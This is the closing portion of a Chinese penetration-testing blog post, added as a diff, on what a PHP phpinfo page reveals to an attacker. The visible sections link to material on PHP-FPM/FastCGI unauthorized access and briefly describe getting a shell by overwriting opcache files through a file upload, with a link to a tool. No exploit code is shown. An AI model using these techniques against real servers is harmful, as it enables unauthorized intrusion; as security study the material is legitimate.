+<h3 id="fastcgi"><a href="#fastcgi" class="headerlink" title="fastcgi"></a>fastcgi</h3><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="external">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p>
+<h2 id="0x04其它"><a href="#0x04其它" class="headerlink" title="0x04其它"></a>0x04其它</h2><h3 id="OPCACHE"><a href="#OPCACHE" class="headerlink" title="OPCACHE"></a>OPCACHE</h3><p>php不存在缓存文件，但是其有opcache，如果有文件上传就可以进行覆盖并getshell</p>
+<p>工具</p>
+<p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="external">https://github.com/GoSecure/php7-opcache-override</a></p>
+<p>参考</p>
+<p><a href="http://skysec.top/2018/04/04/amazing-phpinfo/#OPCACHE" target="_blank" rel="external">http://skysec.top/2018/04/04/amazing-phpinfo/#OPCACHE</a></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基本信息"><span class="toc-number">1.</span> <span class="toc-text">0x01 基本信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#system-info"><span class="toc-number">1.1.</span> <span class="toc-text">system info</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extension-dir"><span class="toc-number">1.2.</span> <span class="toc-text">extension_dir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#真实ip"><span class="toc-number">1.3.</span> <span class="toc-text">真实ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web根目录"><span class="toc-number">1.4.</span> <span class="toc-text">web根目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#临时文件路径"><span class="toc-number">1.5.</span> <span class="toc-text">临时文件路径</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-重要配置"><span class="toc-number">2.</span> <span class="toc-text">0x02 重要配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#allow-url-include"><span class="toc-number">2.1.</span> <span class="toc-text">allow_url_include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#asp-tags"><span class="toc-number">2.2.</span> <span class="toc-text">asp_tags</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#short-open-tag"><span class="toc-number">2.3.</span> <span class="toc-text">short_open_tag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#disable-functions"><span class="toc-number">2.4.</span> <span class="toc-text">disable_functions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#enable-dl"><span class="toc-number">2.5.</span> <span class="toc-text">enable_dl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#magic-quotes-gpc"><span class="toc-number">2.6.</span> <span class="toc-text">magic_quotes_gpc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#open-basedir"><span class="toc-number">2.7.</span> <span class="toc-text">open_basedir</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03扩展"><span class="toc-number">3.</span> <span class="toc-text">0x03扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#imagick"><span class="toc-number">3.1.</span> <span class="toc-text">imagick</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libxml"><span class="toc-number">3.2.</span> <span class="toc-text">libxml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#memcache"><span class="toc-number">3.3.</span> <span class="toc-text">memcache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis"><span class="toc-number">3.4.</span> <span class="toc-text">redis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session"><span class="toc-number">3.5.</span> <span class="toc-text">session</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xdebug"><span class="toc-number">3.6.</span> <span class="toc-text">xdebug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GOPHER"><span class="toc-number">3.7.</span> <span class="toc-text">GOPHER</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastcgi"><span class="toc-number">3.8.</span> <span class="toc-text">fastcgi</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04其它"><span class="toc-number">4.</span> <span class="toc-text">0x04其它</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OPCACHE"><span class="toc-number">4.1.</span> <span class="toc-text">OPCACHE</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&text=phpinfo可以告诉我们什么"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&title=phpinfo可以告诉我们什么"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&is_video=false&description=phpinfo可以告诉我们什么"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=phpinfo可以告诉我们什么&body=Check out this article: http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&title=phpinfo可以告诉我们什么"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&title=phpinfo可以告诉我们什么"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&title=phpinfo可以告诉我们什么"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&title=phpinfo可以告诉我们什么"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&name=phpinfo可以告诉我们什么&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 z3r0yu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
